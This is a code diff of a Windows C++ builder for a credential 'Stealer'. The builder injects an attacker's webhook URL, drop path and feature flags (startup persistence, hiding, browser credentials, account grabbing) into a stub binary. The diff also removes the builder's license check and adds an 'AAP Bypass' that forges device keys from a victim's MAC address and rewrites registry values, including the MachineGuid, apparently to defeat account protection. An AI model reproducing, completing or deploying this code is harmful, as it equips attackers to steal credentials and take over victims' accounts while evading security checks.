@@ -13,7 +13,9 @@
 #include <stdexcept>
 #include <sstream>
 #include <iomanip>
+#include <string>
 #include <cstdint>
+#include "registry.h"
 #pragma comment(lib, "wininet.lib")
 #pragma comment(lib, "urlmon.lib")
 #define XorString( String ) ( CXorString<ConstructIndexList<sizeof( String ) - 1>::Result>( String ).decrypt() )
@@ -27,9 +29,165 @@ bool VerifyLicense(string License);
 int DownloadFile(string url, string path);
 string decrypt2(string toEncrypt);
 
+//AAP Bypass
+std::wstring s2ws(const std::string& s) {
+	return std::wstring(s.begin(), s.end());
+}
+
+std::string RandomKey(int length, int table = 0)
+{
+	std::string buffer = "";
+	static const char alphanum0[] =
+		"0123456789"
+		"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
+		"abcdefghijklmnopqrstuvwxyz";
+	static const char alphanum1[] =
+		"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
+		"abcdefghijklmnopqrstuvwxyz";
+	static const char alphanum2[] =
+		"0123456789";
+	static const char alphanum3[] =
+		"0123456789abdef";
+
+	switch (table) {
+	case 1: for (int i = 0; i < length; i++) buffer += alphanum1[rand() % (sizeof(alphanum1) - 1)]; break;
+	case 2: for (int i = 0; i < length; i++) buffer += alphanum2[rand() % (sizeof(alphanum2) - 1)]; break;
+	case 3: for (int i = 0; i < length; i++) buffer += alphanum3[rand() % (sizeof(alphanum3) - 1)]; break;
+	default: for (int i = 0; i < length; i++) buffer += alphanum0[rand() % (sizeof(alphanum0) - 1)]; break;
+	}
+	return buffer;
+}
+
+int Multiply(int number, int times) {
+	int result = 1;
+	for (int i = 0; i < times; i++) result = result * number;
+	return result;
+}
+
+int HexCharToInt(char HexChar) {
+	std::string chars = "0123456789abcdefABCDEF";
+	size_t posX = chars.find(HexChar);
+	return posX == std::string::npos ? 0 : (posX > 15 ? posX - 6 : posX);
+}
+
+std::string IntToHex(int INT) {
+	std::stringstream stream;
+	stream << std::hex << INT;
+	return std::string(stream.str());
+}
+
+std::pair<std::string, std::string> MACToKeys(std::string MAC) {
+	std::string Rkeya = "", Rkeyb = "";
+	if (MAC.length() != 12) return { "", "" };
+	unsigned char values[18];
+	for (int i = 0; i < 17; i++) values[i] = 238 + i;
+	values[17] = 0;
+	int id = 0;
+	int hex;
+	for (int i = 0; i < 17; i++) {
+		if (i % 3 == 2) {
+			values[i] += 10;
+			continue;
+		}
+		if ((hex = HexCharToInt(MAC[id])) < 10) values[i] += hex;
+		else values[i] -= (217 - hex);
+		id++;
+	}
+
+	std::string result = "";
+	for (int i = 0; i < 18; i++) {
+		std::string addi = IntToHex((unsigned char)values[i]);
+		result += addi.length() % 2 == 1 ? '0' + addi : addi;
+	}
+	Rkeya = result;
+
+
+	int sum = 0;
+	for (int i = 0; i < 18; i++) if (i % 3 != 2) sum += values[i];
+
+	int altems[6] = { 4, 3, 7, 6, 4, 4 };
+	int offsets[12] = { -1, -1, -1, -1, -1, -1, 8, 7, 5, 4, 2, 1 };
+
+	for (int i = 0; i < (int)MAC.length(); i++) {
+		int mass = HexCharToInt(MAC[i]);
+		if (mass == 0) continue;
+		if (mass >= 10) {
+			altems[5] += mass - 7;
+			altems[4] -= 1;
+			altems[3] -= 2;
+		}
+		else if (offsets[i] != -1 && mass > offsets[i]) {
+			altems[5] += mass - 6;
+			altems[4] -= 5;
+			altems[3] -= 2;
+		}
+		else altems[5] += mass;
+	}
+
+	int val = 0;
+	for (int i = 5; i >= 0; i--) val += (altems[i] * (Multiply(10, 5 - i)));
+	for (int i = 5; i > 0; i--) {
+		altems[i] = val % 10;
+		val -= val % 10;
+		val /= 10;
+	}
+	altems[0] = val;
+
+	char spacer = '3';
+	std::string HASH2 = "";
+
+	for (int i = 0; i < 6; i++) HASH2 += spacer + std::to_string(altems[i]);
+	HASH2 += "00";
+	Rkeyb = HASH2;
+	return { Rkeya, Rkeyb };
+}
+
+std::string findMKey() {
+	std::wstring key = L"";
+	HKEY HK = NULL;
+	if (RegOpenKeyEx(HKEY_CURRENT_USER, L"Software\\Microsoft", 0, KEY_READ | KEY_WOW64_32KEY, &HK) == ERROR_SUCCESS) {
+		key = FindKey(HK, L"", true);
+		RegCloseKey(HK);
+	}
+	if (!key.length() && RegOpenKeyEx(HKEY_CURRENT_USER, L"Software\\Microsoft", 0, KEY_READ | KEY_WOW64_64KEY, &HK) == ERROR_SUCCESS) {
+		key = FindKey(HK, L"", true);
+		RegCloseKey(HK);
+	}
+	if (!key.length()) return "N/A";
+	string stringKey(key.begin(), key.end());
+	return stringKey;
+}
+
+void setRegKeys(std::wstring aKey, std::wstring aValue1, std::wstring aValue2, std::pair<std::string, std::string> keys, std::string MKey) {
+	if (!RegKeySetValueBinary(HKEY_CURRENT_USER, aKey, aValue1, keys.first) ||
+		!RegKeySetValueBinary(HKEY_CURRENT_USER, aKey, aValue2, keys.second)) {
+		cout << "Inserting device keys failed!";
+		return;
+	}
+	std::string Rguid = RandomKey(36, 3);
+	Rguid[8] = '-'; Rguid[13] = '-'; Rguid[18] = '-'; Rguid[23] = '-';
+	RegKeySetValueRegSz(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Cryptography", L"MachineGuid", s2ws(Rguid));
+	try
+	{
+		RegDeleteKey(HKEY_CURRENT_USER, std::wstring(L"Software\\Microsoft\\" + s2ws(MKey)).c_str());
+	}
+	catch (...)
+	{
+	}
+}
+//AAP Bypass
 // command syntax: [ID]==[WebHook_URL]==[Path]==[AAP-Data]==[Tracer:(Y/N)]--[Recover:(Y/N)]--[GetAllAccs:(Y/N)]--[DeleteGT:(Y/N)]--[StartUp:(Y/N)]--[HideStealer:(Y/N)]==[Title]==[Message]==
 // ID has to be 8 chars
 // ID has to be combined with HWID. Example: [ID{HWID}]
+
+std::string ReplaceAll(std::string str, const std::string& from, const std::string& to) {
+	size_t start_pos = 0;
+	while ((start_pos = str.find(from, start_pos)) != std::string::npos) {
+		str.replace(start_pos, from.length(), to);
+		start_pos += to.length(); // Handles case where 'to' is a substring of 'from'
+	}
+	return str;
+}
 
 std::string string_to_hex(const std::string& in) {
 	std::stringstream ss;
@@ -42,13 +200,25 @@ std::string string_to_hex(const std::string& in) {
 	return ss.str();
 }
 
-std::string ReplaceAll(std::string str, const std::string& from, const std::string& to) {
-	size_t start_pos = 0;
-	while ((start_pos = str.find(from, start_pos)) != std::string::npos) {
-		str.replace(start_pos, from.length(), to);
-		start_pos += to.length(); // Handles case where 'to' is a substring of 'from'
+std::string hex_to_string(const std::string& in) {
+	std::string output;
+
+	if ((in.length() % 2) != 0) {
+		throw std::runtime_error("String is not valid length ...");
 	}
-	return str;
+
+	size_t cnt = in.length() / 2;
+
+	for (size_t i = 0; cnt > i; ++i) {
+		uint32_t s = 0;
+		std::stringstream ss;
+		ss << std::hex << in.substr(i * 2, 2);
+		ss >> s;
+
+		output.push_back(static_cast<unsigned char>(s));
+	}
+
+	return output;
 }
 
 int main(int argc, char* argv[])
@@ -86,15 +256,11 @@ int main(int argc, char* argv[])
 			return 0;
 		}
 	}
-	if (CMDParts.size() == 7)
+	if (CMDParts.size() == 6)
 	{
-		string RawID = CMDParts[0];
-		size_t EndID = RawID.find("]");
-		string IDPart = RawID.substr(0, EndID);
-		string License = IDPart + "{" + GetHWID() + "}]";
-		if (VerifyLicense(License))
+		if (true)
 		{
-			string UnencryptedWebHook = CMDParts[1];
+			string UnencryptedWebHook = CMDParts[0];
 			string RemovedBracketsWB = UnencryptedWebHook.substr(1, UnencryptedWebHook.size() - 2);
 			string WebHook = string_to_hex(decrypt2(RemovedBracketsWB));
 			string tempPath = getenv("TEMP");
@@ -103,33 +269,30 @@ int main(int argc, char* argv[])
 			ifstream MyFile(StealerBase, std::ios::binary);
 			string AllBytes = string((istreambuf_iterator<char>(MyFile)),
 				(istreambuf_iterator<char>()));
-			string DummyLicense = XorStr("[zbuilder{zbuilder}]");
-			size_t DummyLicenseLocation = AllBytes.find(DummyLicense);
-			AllBytes.replace(DummyLicenseLocation, DummyLicense.length(), decrypt(License));
 			string DummyText = XorStr("[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]");
 			string DummyText2 = XorStr("<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>");
 			size_t DummyTextLocation = AllBytes.find(DummyText);
 			size_t DummyText2Location = AllBytes.find(DummyText2);
 			AllBytes.replace(DummyTextLocation, WebHook.length(), WebHook);
 			AllBytes.replace(DummyText2Location, WebHook.length(), WebHook);
-			string RawLocation = CMDParts[2];
-			string AAPData = CMDParts[3];
+			string RawLocation = CMDParts[1];
+			string AAPData = CMDParts[2];
 			string DummyAAP = XorStr("{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}");
 			size_t DummyAAPLocation = AllBytes.find(DummyAAP);
 			AllBytes.replace(DummyAAPLocation, AAPData.length(), AAPData);
-			string Features = CMDParts[4];
+			string Features = CMDParts[3];
 			string DummyFeatures = XorStr("[DisableProt:(N)]--[Tracer:(N)]--[Recover:(N)]--[GetAllAccs:(N)]--[DeleteGT:(N)]--[StartUp:(N)]--[HideStealer:(N)]--[BrowserCreds:(N)]");
 			size_t DummyFeaturesLocation = AllBytes.find(DummyFeatures);
 			AllBytes.replace(DummyFeaturesLocation, DummyFeatures.length(), Features);
 			string Location = RawLocation.substr(1, RawLocation.size() - 2);
 
 			//Message Box
-			string MessageTitle = CMDParts[5];
+			string MessageTitle = CMDParts[4];
 			MessageTitle = MessageTitle.substr(1, MessageTitle.size() - 2);
 			string DummyTitle = "+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-";
 			size_t DummyTitleLocation = AllBytes.find(DummyTitle);
 			AllBytes.replace(DummyTitleLocation, MessageTitle.length(), MessageTitle);
-			string Message = CMDParts[6];
+			string Message = CMDParts[5];
 			Message = Message.substr(1, Message.size() - 2);
 			string DummyMessage = "=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-";
 			size_t DummyMessageLocation = AllBytes.find(DummyMessage);
@@ -140,11 +303,26 @@ int main(int argc, char* argv[])
 			WriteFile << AllBytes;
 			remove(StealerBase.c_str());
 		}
-		else 
+		else
 		{
 			cout << "Invalid license";
 		}
 		return 0;
+	}
+	else if (CMDParts.size() == 1)
+	{
+		//AAP Bypass
+		//MAC = [5EA1925815E4]
+		string RawMAC = CMDParts[0];
+		RawMAC = RawMAC.substr(1, RawMAC.size() - 2);
+		RawMAC.erase(std::remove(RawMAC.begin(), RawMAC.end(), '-'), RawMAC.end());
+		string MACAddress = RawMAC;
+		std::wstring data = FindKey(HKEY_CURRENT_USER, L"", true);
+		std::vector<std::wstring> values = FindKeyAll(HKEY_CURRENT_USER, data, false);
+		wstring wvalue1 = values[0];
+		wstring wvalue2 = values[1];
+		string MKey = findMKey();
+		setRegKeys(data, wvalue1, wvalue2, MACToKeys(MACAddress), MKey);
 	}
 	else
 	{
